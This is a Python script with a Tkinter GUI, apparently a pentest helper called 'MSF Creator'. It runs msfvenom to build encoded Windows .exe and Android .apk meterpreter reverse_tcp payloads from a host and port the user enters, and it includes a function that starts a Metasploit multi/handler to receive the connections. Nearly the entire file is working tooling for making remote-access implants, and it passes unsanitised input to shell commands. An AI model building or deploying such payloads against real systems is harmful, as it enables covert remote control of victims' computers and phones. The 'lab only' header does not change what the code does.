import subprocess
import time
import os
import socket
import tkinter as tk

#########################################################
# CREATED TO VULNERABILITY AND PENTEST ENVIRONMENT ONLY #

# GET LOCAL IP 
ip_address = ''
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    # Tenta conectar ao Google DNS para obter o endereço IP local
    s.connect(('8.8.8.8', 80))
    ip_address = s.getsockname()[0]
finally:
    s.close()


# TITLE
app_title = "MSF Creator"

# INIT
def init():

	window =  tk.Tk()
	window.title(app_title)
	window.geometry("600x500")
	window.resizable(False, False)

	def on_closing():
		pass

	window.protocol("WM_DELETE_WINDOW", on_closing)

	tk.Label(window).pack()
	tk.Label(window).pack()
	tk.Label(window, text="MSF Creator", font=("arial", 24, "bold")).pack()
	tk.Label(window).pack()
	tk.Label(window).pack()
	tk.Button(window, text="Create Payload", command=venomCreate, width=40, height=2).pack(pady=10, anchor="center", fill="none")
	tk.Button(window, text="Start Msfconsole", width=40, height=2).pack(pady=10, anchor="center", fill="none")
	tk.Button(window, text="Exit", command=exitApp, width=40, height=2).pack(pady=10, anchor="center", fill="none")


	window.mainloop()



# CREATE VENOM

def venomCreate():

	window = tk.Tk()
	window.title(app_title + " - Payload")
	window.geometry("500x520")
	window.resizable(False, False)

	tk.Label(window).pack()
	tk.Label(window).pack()
	tk.Label(window, text="MSF Creator - Payload", font=("arial", 24, "bold")).pack()
	tk.Label(window).pack()
	tk.Label(window).pack()
	tk.Label(window, text="Select the OS").pack()
	# Opções para o dropdown
	options = ["Windows", "Android"]
	# Cria a variável que será usada para armazenar a opção selecionada
	selected_option = tk.StringVar(window)
	# Define o valor padrão da variável como a primeira opção
	selected_option.set(options[0])
	# Cria o OptionMenu e o associa à variável
	optionmenu = tk.OptionMenu(window, selected_option, *options)
	optionmenu.config(width=40)
	optionmenu.config(height=2)
	optionmenu.pack()
	tk.Label(window).pack()


	# HOST
	tk.Label(window, text="Set the Host (Your Local IP is "+ip_address+")").pack()
	input_host = tk.Entry(window, width=27, font=("Arial", 18))
	input_host.insert(tk.END, ip_address)
	input_host.pack()
	tk.Label(window).pack()

	# PORT
	tk.Label(window, text="Set the Port:").pack()
	input_port = tk.Entry(window, width=27, font=("Arial", 18))
	input_port.insert(tk.END, "7777")
	input_port.pack()
	tk.Label(window).pack()

	# PAYLOAD NAME
	tk.Label(window, text="Set Payload's Name:").pack()
	input_name = tk.Entry(window, width=27, font=("Arial", 18))
	input_name.insert(tk.END, "mypayload")
	input_name.pack()
	tk.Label(window).pack()




	def payload_create():
		pl_option = selected_option.get()
		name = input_name.get()
		lhost = input_host.get()
		lport = input_port.get()

		if pl_option == "Windows":
		    payload = "windows/meterpreter/reverse_tcp"
		    pl = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -e x86/shikata_ga_nai -i 3 -f exe -o {}.exe".format(lhost, lport, name)
		    print("\nThe Payload will be generated...")
		    subprocess.run(pl, shell=True)
		    d = subprocess.run("pwd", shell=True, stdout=subprocess.PIPE)
		    r = d.stdout.decode('utf-8')
		    popup = tk.Toplevel()
		    popup.title("Payload Created")
		    popup.geometry("400x100")
		    label = tk.Label(popup, text="Payload saved at "+r+"/"+name+".exe")
		    label.pack(pady=10)
		    close_button = tk.Button(popup, text="Close", command=popup.destroy)
		    close_button.pack(pady=10)


		elif pl_option == "Android":
		    payload = "android/meterpreter/reverse_tcp"
		    pl = "msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}.apk".format(lhost, lport, name)
		    print("\nThe Payload will be generated...")
		    subprocess.run(pl, shell=True)
		    d = subprocess.run("pwd", shell=True, stdout=subprocess.PIPE)
		    r = d.stdout.decode('utf-8')
		    popup = tk.Toplevel()
		    popup.title("Payload Created")
		    popup.geometry("400x100")
		    label = tk.Label(popup, text="Payload saved at "+r+"/"+name+".apk")
		    label.pack(pady=10)
		    close_button = tk.Button(popup, text="Close", command=popup.destroy)
		    close_button.pack(pady=10)

		else:
		    print("!")


	tk.Button(window, text="Build Payload", width=40, height=2, command=payload_create).pack()



	window.mainloop()

		


# START MSFCONSOLE
def msfStart(lhost, lport, payload):
	print("Initializate MsfConsole with configuration set? [y/n]")
	opt = input("> ")
	if opt == "y":
		msf_cmd = 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {}; set LHOST {}; set LPORT {}; run"'.format(payload, lhost, lport)
		subprocess.run(msf_cmd, shell=True)
	elif opt == "n":
		subprocess.run("clear", shell=True)
	else:
		msf_cmd = 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {}; set LHOST {}; set LPORT {}; run"'.format(payload, lhost, lport)
		subprocess.run(msf_cmd, shell=True)


def msfStartNoOpt():
	print("\nInitializating...")
	subprocess.run("msfconsole", shell=True)

def exitApp():
	exit()

init()	



